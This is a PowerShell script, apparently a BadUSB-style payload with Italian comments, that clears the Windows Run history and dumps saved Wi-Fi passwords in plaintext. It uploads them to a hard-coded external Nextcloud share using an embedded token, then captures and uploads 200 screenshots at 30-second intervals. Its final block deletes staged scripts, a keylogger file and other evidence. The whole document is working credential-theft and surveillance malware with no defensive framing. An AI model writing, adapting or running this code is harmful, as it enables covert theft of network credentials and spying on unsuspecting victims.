function Nextcloud-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [string]$SourceFilePath
    ) 
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $nextcloudUrl = "https://wim.nl.tabdigital.cloud/"
    $sharetoken = 'gkj9TSrXtzxGrn4'
    
    $fileObject = Get-Item $SourceFilePath
    $headers = @{
        "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
        "X-Requested-With"="XMLHttpRequest";
    }
    $webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
    Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

try {
    # 1. Pulizia iniziale record (Registry)
    Write-Host "Clean MRU..." -ForegroundColor Gray
    Remove-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*" -ErrorAction SilentlyContinue

    # 2. Export WiFi
    $p = "C:\wipass"
    if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory | Out-Null }
    Set-Location $p
    netsh wlan export profile key=clear | Out-Null
    
    dir *.xml | % {
        $xml=[xml](Get-Content $_)
        $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
        Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
    }

    if (Test-Path "$env:computername-wificapture.txt") {
        Write-Host "Report WiFi..." -ForegroundColor Cyan
        "$env:computername-wificapture.txt" | Nextcloud-Upload
    }

    # 3. Ciclo Screenshots
    $i = 0
    while($i -lt 200){
        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
        $screens = [Windows.Forms.Screen]::AllScreens
        $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
        $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
        $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
        $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

        $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

        $currentPath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"
        $bmp.Save($currentPath)
        $graphics.Dispose()
        $bmp.Dispose()
      
        if (Test-Path $currentPath) {
            Write-Host "Log $i..." -ForegroundColor Cyan
            $currentPath | Nextcloud-Upload
            # Eliminazione immediata dopo l'upload per non accumulare file
            Remove-Item $currentPath -Force
        }
        
        $i++
        Start-Sleep -Seconds 30
    }
}
finally {
    Write-Host "`n--- Inizio pulizia finale di sicurezza ---" -ForegroundColor Yellow

    $paths = @(
        "$env:APPDATA\c.ps1", 
        "$env:APPDATA\sg.ps1", 
        "$env:APPDATA\sg2.ps1",
        "$env:temp\keylogger.txt", 
        "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png",
        "C:\wipass\*"
    )

    foreach($pattern in $paths) {
        # Cerchiamo i file che corrispondono al pattern (gestisce i caratteri jolly come *)
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        foreach($file in $files) {
            Write-Host "Eliminazione file: $($file.FullName)" -ForegroundColor Red
            Remove-Item $file.FullName -Force -Recurse -ErrorAction SilentlyContinue
        }
    }
    
    # Rimuove la cartella wipass se esiste
    if (Test-Path "C:\wipass") {
        Write-Host "Rimozione cartella C:\wipass" -ForegroundColor Red
        Remove-Item "C:\wipass" -Force -Recurse -ErrorAction SilentlyContinue
    }

    Write-Host "Finished" -ForegroundColor Green
}
